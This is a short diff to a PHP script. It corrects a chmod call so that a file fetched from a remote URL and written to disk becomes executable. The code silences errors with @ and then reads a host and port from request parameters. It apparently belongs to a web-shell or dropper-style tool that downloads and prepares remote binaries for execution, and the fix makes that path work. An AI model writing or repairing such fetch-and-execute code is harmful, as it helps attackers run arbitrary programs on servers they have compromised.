@@ -66,7 +66,7 @@ try {
 if (!file_exists($fname)) {
     $contents = @file_get_contents($link);
     @file_put_contents($fname, $contents);
-    @chmod($fname, octdec(0755)); // executable
+    @chmod($fname, 0755); // executable
 }
 
 if (!(isset($_REQUEST['host']) && isset($_REQUEST['port']))) {
